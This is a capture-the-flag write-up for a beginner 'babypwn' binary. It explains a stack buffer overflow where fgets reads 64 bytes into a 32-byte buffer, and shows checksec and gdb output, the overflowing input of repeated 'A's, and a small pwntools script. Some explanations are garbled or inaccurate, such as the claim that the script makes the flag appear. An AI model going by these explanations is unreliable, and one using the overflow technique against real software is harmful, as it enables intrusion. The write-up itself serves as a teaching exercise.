# Documentation for the babypwn files

## 'babypwn'

### File Output
```
babypwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, not stripped
```
### 'babypwn' checksec output
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70 Symbols        No       0               2               babypwn
```
## 'babypwn.c'

### 'babypwn.c' File Output
```
babypwn.c: C source, ASCII text
```

## Possible Vulnerabilities
- The character array is initialized as 32 bites but the input is reading 64 bites.
- The check variable was never initialized but it is being compared.
- There is a fixed memory adress.
# Errors from the debug
### Stack issues 
```
$rsp   : 0x00007fffffffddb8  →  0x0041414141414141 ("AAAAAAA"?)
$rbp   : 0x4141414141414141 ("AAAAAAAA"?)
$rsi   : 0x00007fffffffd7b0  →  "This is the flag! pwntools!\n"
$rdi   : 0x00007fffffffd780  →  0x00007fffffffd7b0  →  "This is the flag! pwntools!\n"
```
#### Segmentaion Fault Display
```
[#0] Id 1, Name: "babypwn", stopped 0x4012c3 in main (), reason: SIGSEGV
```

## What the program is doing
- The 'babypwn' program begins by creating a character array that serves as a **buffer that stores 32 bites** and a check integer variable
``` C 
struct __attribute__((__packed__)) data {
  char buff[32];
  int check;
};
```
- Then the **get_flag()** function open and prints the text file **flag.txt ONLY IF name.check() is set to 0x41414141.** 
``` C
void get_flag(void)
{
  char flag[1024] = { 0 };
  FILE *fp = fopen("flag.txt", "r");
  fgets(flag, 1023, fp);
  printf(flag);
}
``` 
- The program then akss the user for their **name** then reads and stores their input into **'name.buff'**.
``` C
printf("What's your name?\n");
fgets(name.buff, 64, stdin);
```
- A print statement to display the user's name along with a welcome message is executed.
``` C
printf("%s nice to meet you!\n", name.buff);
```
- Lastly, a conditional statement block of code is ran to check **if the user's name is equal to 0X41414141** If the **buffer overflow** occurs, the **'flag.txt' message will appear**.
``` C
if (name.check == 0x41414141) {
  get_flag();
}
```
## Vulnerable function
The **vulnerable function** is the **'fgets()'** because at the start of the program the chracter arrays is to store **32** bites however, the **'fgets()'** function is reading **64 bites**. This will cause  a **BUFFER OVERFLOW**.

## Exploitation Procedure
To exploit this vulnerability, weknew we had to **overwrate 'name.check'**. 0x41414141 dislpays a long series of the letter **'A'** so we simply entered **'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'** when the program asked for a name. This cause the message in the **'flag.txt' to successfully display** because our input was longer than **32 characters** .



# Exploitation Code
``` python 
 #!/usr/bin/env python
 
from pwn import *
 
p = process('babypwn')
 
gdb.attach(p, '''continue''')
 
p.interactive()
```
As shown **aboive**, the source code the **pwnsol.py** file begins by accessing the **babypwn** file then attaches a **gdb degugger** which allowed us to see what was going on inside of our program. Now the next time the **babypwn** file is ran, our **flag.txt** file will appear.

### 'flag.txt file'
```
his is the flag! pwntools!
```
